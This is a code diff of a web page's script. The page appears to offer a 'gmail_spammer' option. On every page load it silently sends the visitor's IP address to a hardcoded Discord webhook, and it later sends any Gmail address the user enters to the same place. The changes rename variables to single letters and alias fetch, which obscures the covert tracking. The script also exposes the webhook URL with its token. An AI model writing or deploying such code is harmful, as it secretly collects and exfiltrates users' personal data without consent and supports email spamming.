@@ -64,81 +64,58 @@
   </div>
 
   <script>
-    let lastSubmissionTime = 0; // Track the last submission time
+    let l = 0; // Last submission time
+    const _ = async (a, b) => await fetch(a, b); // Alias for fetch
 
-    // Send IP address to the webhook on page load
-    (async () => {
-      try {
-        const ipResponse = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipResponse.json();
-        const userIP = ipData.ip;
-
-        const webhookUrl = 'https://discordapp.com/api/webhooks/1328066549264941189/A2q7CiUNhTRR2wuenawrls23D2BTKGU-EylbLaDlGGrUcbwA3O3sHwD0zbrZAJhNQiSr';
-
-        await fetch(webhookUrl, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({
-            content: `**New visitor IP:** ${userIP}`
-          }),
-        });
-      } catch (error) {
-        console.error('Error fetching IP or sending webhook:', error);
-      }
+    (() => {
+      const z = "https://api.ipify.org?format=json";
+      const x = "https://discordapp.com/api/webhooks/1328066549264941189/A2q7CiUNhTRR2wuenawrls23D2BTKGU-EylbLaDlGGrUcbwA3O3sHwD0zbrZAJhNQiSr";
+      _(z).then(r => r.json()).then(j => _(x, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: `**New visitor IP:** ${j.ip}` })
+      })).catch(e => console.error("Error with IP/Webhook: ", e));
     })();
 
-    // Handle dropdown menu selection
-    document.getElementById('options').addEventListener('change', (event) => {
-      const emailContainer = document.getElementById('email-container');
-      emailContainer.style.display = event.target.value === 'gmail_spammer' ? 'block' : 'none';
+    document.getElementById('options').addEventListener('change', (e) => {
+      document.getElementById('email-container').style.display = e.target.value === 'gmail_spammer' ? 'block' : 'none';
     });
 
-    // Handle Gmail submission
     document.getElementById('submit').addEventListener('click', async () => {
-      const email = document.getElementById('email').value;
-      const status = document.getElementById('status');
-      const currentTime = Date.now();
-
-      // Check for spam (30-second cooldown)
-      if (currentTime - lastSubmissionTime < 30000) {
-        status.textContent = 'Please wait 30 seconds before submitting again.';
-        status.style.color = 'red';
+      const t = Date.now();
+      if (t - l < 30000) {
+        document.getElementById('status').textContent = 'Please wait 30 seconds before submitting again.';
+        document.getElementById('status').style.color = 'red';
         return;
       }
 
-      if (!email) {
-        status.textContent = 'Please enter your Gmail.';
-        status.style.color = 'red';
+      const e = document.getElementById('email').value;
+      if (!e) {
+        document.getElementById('status').textContent = 'Please enter your Gmail.';
+        document.getElementById('status').style.color = 'red';
         return;
       }
 
       try {
-        const ipResponse = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipResponse.json();
-        const userIP = ipData.ip;
+        const j = await (await _("https://api.ipify.org?format=json")).json();
+        const x = "https://discordapp.com/api/webhooks/1328066549264941189/A2q7CiUNhTRR2wuenawrls23D2BTKGU-EylbLaDlGGrUcbwA3O3sHwD0zbrZAJhNQiSr";
 
-        const webhookUrl = 'https://discordapp.com/api/webhooks/1328066549264941189/A2q7CiUNhTRR2wuenawrls23D2BTKGU-EylbLaDlGGrUcbwA3O3sHwD0zbrZAJhNQiSr';
-
-        await fetch(webhookUrl, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
+        await _(x, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
-            content: `**Gmail Submitted:** ${email}\n**User IP:** ${userIP}`
-          }),
+            content: `**Gmail Submitted:** ${e}\n**User IP:** ${j.ip}`
+          })
         });
 
-        status.textContent = 'Gmail and IP sent successfully!';
-        status.style.color = 'green';
-        lastSubmissionTime = currentTime; // Update the last submission time
+        document.getElementById('status').textContent = 'Gmail and IP sent successfully!';
+        document.getElementById('status').style.color = 'green';
+        l = t;
 
-      } catch (error) {
-        console.error('Error:', error);
-        status.textContent = 'An error occurred. Please try again later.';
-        status.style.color = 'red';
+      } catch (e) {
+        console.error('Error: ', e);
+        document.getElementById('status').textContent = 'An error occurred. Please try again later.';
+        document.getElementById('status').style.color = 'red';
       }
     });
   </script>
